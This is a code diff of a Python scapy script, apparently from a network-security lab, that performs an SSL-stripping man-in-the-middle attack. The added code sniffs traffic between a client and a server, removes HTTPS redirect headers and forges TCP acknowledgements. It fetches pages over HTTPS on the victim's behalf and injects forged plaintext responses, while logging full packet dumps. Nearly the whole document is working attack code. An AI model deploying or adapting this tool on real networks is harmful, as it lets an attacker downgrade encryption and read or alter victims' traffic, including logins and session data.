@@ -1,67 +1,8 @@
 import scapy.all as sc
+import http.client
+from urllib.parse import urlparse
 
-serverMac = ""
-serverIP = "131.155.244.97"
-
-clientIP = ""
-clientMac = ""
-
-attackerIP = ""
-attackerMac = ""
-
-
-
-sc.load_layer("http")
-
-def stripping(cIP, cMAC, sIP, sMAC, aIP, aMAC):
-    clientIP = cIP
-    clientMAC = cMAC
-    serverIP = sIP
-    serverMac = sMAC
-    attackerIP = aIP
-    attackerMac = aMAC
-    while True:
-        sc.sniff(filter="tcp port 80 or tcp port 443", prn=handle_packet, store=False)
-
-
-def handle_packet(pkt):
-    global clientIP, clientMac
-    
-    #Handle http(s) request from client
-    clientIP = pkt[sc.IP].src
-    clientMac = pkt[sc.Ether].src
-
-    if not pkt.haslayer(sc.IP) or not pkt.haslayer(sc.TCP) or not pkt[sc.IP].dst == attackerIP:
-        return
-    dstPort = pkt[sc.TCP].dport
-
-    #determine wether client send http or https
-    if dstPort == 443:
-        print(f"HTTPS request from client: {pkt.summary()}")
-        forward_to_server(pkt)
-        forwarding
-    if dstPort == 80:
-        print(f"HTTP request from client: {pkt.summary()}")
-        forward_to_server(pkt)
-   
-   #wait for server response
-
-    pkt = sc.sniff(filter=f"tcp and src host {serverIP} and dst port 80", store=False)
-    log_packet("server -> client", pkt)
-
-    #if server sends reset. reset
-    if (is_rst(pkt)):
-        forward_to_client(pkt)
-        return
-    else:
-        resp_ssl_strip(pkt)
-    ack = sc.sniff(lfilter=is_server_ack, count=1, timeout=5)
-    print(f"HTTP ACK from server: {ack.summary()}")
-    log_packet("server -> client", pkt)
-    forwarding
-
-
-
+# Filter HTTPS redirect responses
 def filter_response(pkt):
     return (
         pkt.haslayer(sc.Raw) and
@@ -69,16 +10,10 @@ def filter_response(pkt):
         b"Location: https://" in pkt[sc.Raw].load
     )
 
+# Strip "Location: https://" header from redirect
+def resp_ssl_strip(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP):
+    print(f"Stripping HTTPS redirect: {pkt.summary()}")
 
-def resp_ssl_strip(pkt):
-    print(f"Packet from server to client: {pkt.summary()}")
-    
-    if not filter_response(pkt):
-        forward_to_client(pkt)
-        forwarding
-        return
-
-    #remove https switch request
     data = pkt[sc.Raw].load
     lines = data.split(b"\r\n")
     stripped_lines = [line for line in lines if not line.startswith(b"Location: https://")]
@@ -93,10 +28,14 @@ def resp_ssl_strip(pkt):
         ack=pkt[sc.TCP].ack,
         flags=pkt[sc.TCP].flags
     )
-    raw = new_load
-    new_pkt = ether / ip / tcp / raw
+    new_pkt = ether / ip / tcp / sc.Raw(load=new_load)
+
+    del new_pkt[sc.IP].chksum
+    del new_pkt[sc.TCP].chksum
+
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
 
+    # ACK to server to maintain TCP state
     ack_pkt = sc.IP(src=attackerIP, dst=serverIP) / sc.TCP(
         sport=pkt[sc.TCP].dport,
         dport=pkt[sc.TCP].sport,
@@ -105,49 +44,74 @@ def resp_ssl_strip(pkt):
         flags="A"
     )
     sc.send(ack_pkt, verbose=False)
-    return
 
-def is_server_ack(pkt):
-    return (
-        pkt.haslayer(sc.TCP)
-        and pkt[sc.IP].src == serverIP
-        and pkt[sc.IP].dst == attackerIP
-        and pkt[sc.TCP].flags == "A" 
-    )
+def terminate_tls_and_forward(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP):
+    try:
+        raw_data = pkt[sc.Raw].load
 
-#check if packet is rst or fin
+        # Extract request line
+        request_line = raw_data.split(b"\r\n")[0]
+        method, path, *_ = request_line.decode(errors="ignore").split()
+
+        # Parse headers
+        headers = {}
+        header_section, _, body = raw_data.partition(b"\r\n\r\n")
+        lines = header_section.split(b"\r\n")[1:]  # Skip request line
+        for line in lines:
+            if b": " in line:
+                key, value = line.decode(errors="ignore").split(": ", 1)
+                headers[key] = value
+
+        host = headers.get("Host")
+        if not host:
+            print("[!] No Host header found.")
+            return
+
+        # Send HTTPS request to server
+        conn = http.client.HTTPSConnection(host, timeout=5)
+        body = body if body else None
+        conn.request(method, path, body=body, headers=headers)
+        response = conn.getresponse()
+        response_body = response.read()
+
+        # Build HTTP/1.1 response
+        response_headers = [f"HTTP/1.1 {response.status} {response.reason}"]
+        for hdr, val in response.getheaders():
+            response_headers.append(f"{hdr}: {val}")
+        response_headers.append("")  # End of headers
+        http_response = "\r\n".join(response_headers).encode() + b"\r\n" + response_body
+
+        # Send response to client with corrected SEQ/ACK
+        seq = pkt[sc.TCP].ack
+        ack = pkt[sc.TCP].seq + len(raw_data)
+
+        ether = sc.Ether(src=attackerMac, dst=clientMac)
+        ip = sc.IP(src=attackerIP, dst=clientIP)
+        tcp = sc.TCP(
+            sport=pkt[sc.TCP].sport,
+            dport=pkt[sc.TCP].dport,
+            seq=seq,
+            ack=ack,
+            flags='PA'
+        )
+        forged_pkt = ether / ip / tcp / sc.Raw(load=http_response)
+
+        # Force recalculation of checksums
+        del forged_pkt[sc.IP].chksum
+        del forged_pkt[sc.TCP].chksum
+
+        sc.sendp(forged_pkt, iface=sc.conf.iface, verbose=False)
+
+    except Exception as e:
+        print(f"[!] TLS Termination Error: {e}")
+
 def is_rst(pkt):
     return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags
 
 def is_tcp_fin(pkt):
     return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags
 
-
-
-
-#keep forwarding from client to server and log all packets
-def forward(cIP, cMAC, sIP, sMAC, aIP, aMAC):
-    clientIP = cIP
-    clientMAC = cMAC
-    serverIP = sIP
-    serverMac = sMAC
-    attackerIP = aIP
-    attackerMac = aMAC
-    forwarding
-
-def forwarding():
-    while (True):
-        nxt_pkt = sc.sniff(filter="http")
-        if (nxt_pkt[sc.IP].src == clientIP):
-            forward_to_server(nxt_pkt)
-            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
-                return
-        if (nxt_pkt[sc.IP].src == serverIP):
-            forward_to_client(nxt_pkt)
-            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
-                return
-            
-def forward_to_client(pkt):
+def forward_to_client(pkt, attackerMac, clientMac, attackerIP, clientIP):
     ether = sc.Ether(src=attackerMac, dst=clientMac)
     ip = sc.IP(src=attackerIP, dst=clientIP)
     tcp = sc.TCP(
@@ -157,16 +121,12 @@ def forward_to_client(pkt):
         ack=pkt[sc.TCP].ack,
         flags=pkt[sc.TCP].flags
     )
-    if pkt.haslayer(sc.Raw):
-        raw = sc.Raw(load=pkt[sc.Raw].load)
-        new_pkt = ether / ip / tcp / raw
-    else:
-        new_pkt = ether / ip / tcp
+    payload = sc.Raw(load=pkt[sc.Raw].load) if pkt.haslayer(sc.Raw) else None
+    new_pkt = ether / ip / tcp / payload if payload else ether / ip / tcp
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
     log_packet("server -> client", pkt)
 
-
-def forward_to_server(pkt):
+def forward_to_server(pkt, attackerMac, serverMac, attackerIP, serverIP):
     ether = sc.Ether(src=attackerMac, dst=serverMac)
     ip = sc.IP(src=attackerIP, dst=serverIP)
     tcp = sc.TCP(
@@ -176,18 +136,46 @@ def forward_to_server(pkt):
         ack=pkt[sc.TCP].ack,
         flags=pkt[sc.TCP].flags
     )
-    if pkt.haslayer(sc.Raw):
-        raw = sc.Raw(load=pkt[sc.Raw].load)
-        new_pkt = ether / ip / tcp / raw
-    else:
-        new_pkt = ether / ip / tcp
+    payload = sc.Raw(load=pkt[sc.Raw].load) if pkt.haslayer(sc.Raw) else None
+    new_pkt = ether / ip / tcp / payload if payload else ether / ip / tcp
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
     log_packet("client -> server", pkt)
 
+def forwarding(mode, clientIP, attackerIP, clientMac, serverIP, attackerMac, serverMac):
+    while True:
+        pkt = sc.sniff(
+            filter="tcp port 80 or port 443",
+            iface=sc.conf.iface,
+            store=True,
+            count=1,
+            lfilter=lambda p: p.haslayer(sc.IP) and p.haslayer(sc.TCP) and (
+                p[sc.IP].src == clientIP or p[sc.IP].src == serverIP
+            )
+        )[0]
+        print("next is sniffed")
+        log_packet("sniffed", pkt)
 
-            
+        if pkt[sc.IP].src == clientIP:
+            if mode and pkt.haslayer(sc.Raw):
+                terminate_tls_and_forward(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP)
+            else:
+                forward_to_server(pkt, attackerMac, serverMac, attackerIP, serverIP)
 
+            if is_rst(pkt) or is_tcp_fin(pkt):
+                return
 
-def log_packet(direction, pkt):
-    with open("packet_log.txt", "a") as log_file:
-        log_file.write(f"[{direction}] {pkt.summary()}\n")
+        elif pkt[sc.IP].src == serverIP:
+            if mode and filter_response(pkt):
+                resp_ssl_strip(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP)
+            else:
+                forward_to_client(pkt, attackerMac, clientMac, attackerIP, clientIP)
+
+            if is_rst(pkt) or is_tcp_fin(pkt):
+                return
+
+def log_packet(tag, pkt, filename="packet_log.txt"):
+    with open(filename, "a") as f:
+        f.write(f"=== {tag} Packet ===\n")
+        f.write(pkt.summary() + "\n")
+        f.write(str(pkt.show(dump=True)))
+        f.write("\n===================\n\n")
